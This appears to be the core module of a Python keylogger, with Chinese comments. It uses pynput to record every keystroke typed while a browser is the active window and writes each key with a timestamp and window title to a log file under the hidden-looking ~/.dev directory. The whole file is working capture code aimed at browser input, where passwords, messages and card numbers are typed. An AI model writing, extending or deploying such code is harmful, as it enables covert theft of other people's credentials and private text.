# -*- coding: utf-8 -*-
"""
键盘记录器核心模块
"""

import sys
from datetime import datetime
from pathlib import Path

from pynput.keyboard import Key, KeyCode

from .detectors import get_active_window_name, is_browser_active


class KeyLogger:
    """键盘记录器"""

    def __init__(self, log_file: Path):
        self.log_file = log_file
        self.listener = None

    def format_key(self, key) -> str:
        """格式化按键为可读字符串"""
        if isinstance(key, KeyCode):
            return key.char if key.char is not None else f"[{key.name}]"
        elif isinstance(key, Key):
            key_names = {
                Key.space: " ",
                Key.enter: "[Enter]",
                Key.tab: "[Tab]",
                Key.backspace: "[Backspace]",
                Key.delete: "[Delete]",
                Key.esc: "[Esc]",
                Key.up: "[Up]",
                Key.down: "[Down]",
                Key.left: "[Left]",
                Key.right: "[Right]",
                Key.shift: "[Shift]",
                Key.shift_l: "[Shift]",
                Key.shift_r: "[Shift]",
                Key.ctrl: "[Ctrl]",
                Key.ctrl_l: "[Ctrl]",
                Key.ctrl_r: "[Ctrl]",
                Key.alt: "[Alt]",
                Key.alt_l: "[Alt]",
                Key.alt_r: "[Alt]",
                Key.cmd: "[Cmd]",
                Key.caps_lock: "[CapsLock]",
                Key.home: "[Home]",
                Key.end: "[End]",
                Key.page_up: "[PageUp]",
                Key.page_down: "[PageDown]",
                Key.f1: "[F1]", Key.f2: "[F2]", Key.f3: "[F3]", Key.f4: "[F4]",
                Key.f5: "[F5]", Key.f6: "[F6]", Key.f7: "[F7]", Key.f8: "[F8]",
                Key.f9: "[F9]", Key.f10: "[F10]", Key.f11: "[F11]", Key.f12: "[F12]",
            }
            return key_names.get(key, f"[{key.name}]")
        return str(key)

    def on_press(self, key):
        """键盘按下事件"""
        if not is_browser_active():
            return

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_name = get_active_window_name() or "Unknown"
        key_str = self.format_key(key)

        log_line = f"[{timestamp}] [{window_name}] {key_str}\n"

        # 写入日志文件
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_line)
                f.flush()
        except Exception as e:
            print(f"写入日志失败: {e}", file=sys.stderr)

    def on_release(self, key):
        """键盘释放事件（用于退出）"""
        # F12 退出
        if key == Key.f12:
            print("\n检测到 F12，停止记录...")
            return False

    def start(self):
        """启动键盘监听"""
        from pynput import keyboard

        print(f"浏览器键盘记录器已启动")
        print(f"日志文件: {self.log_file}")
        print(f"平台: {self.platform_info()}\n")

        print("正在监控浏览器键盘输入...")
        print("按 F12 停止记录\n")

        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self.listener.start()
        self.listener.join()

    @staticmethod
    def platform_info() -> str:
        """获取平台信息"""
        import platform
        return f"{platform.system()} {platform.release()}"


def create_log_file(log_dir: Path = None) -> Path:
    """
    创建日志文件

    Args:
        log_dir: 日志目录，默认为 ~/.dev

    Returns:
        日志文件路径
    """
    if log_dir is None:
        log_dir = Path.home() / ".dev"

    log_dir.mkdir(parents=True, exist_ok=True)

    # 生成日志文件名（带时间戳）
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = log_dir / f"keylogger_{timestamp}.log"

    # 写入日志头部
    import platform
    try:
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(f"# 浏览器键盘记录日志\n")
            f.write(f"# 启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# 平台: {platform.system()} {platform.release()}\n")
            f.write(f"# 日志格式: [时间] [窗口名称] 按键内容\n")
            f.write(f"# {'=' * 60}\n\n")
    except Exception as e:
        print(f"无法创建日志文件: {e}", file=sys.stderr)
        raise

    return log_file
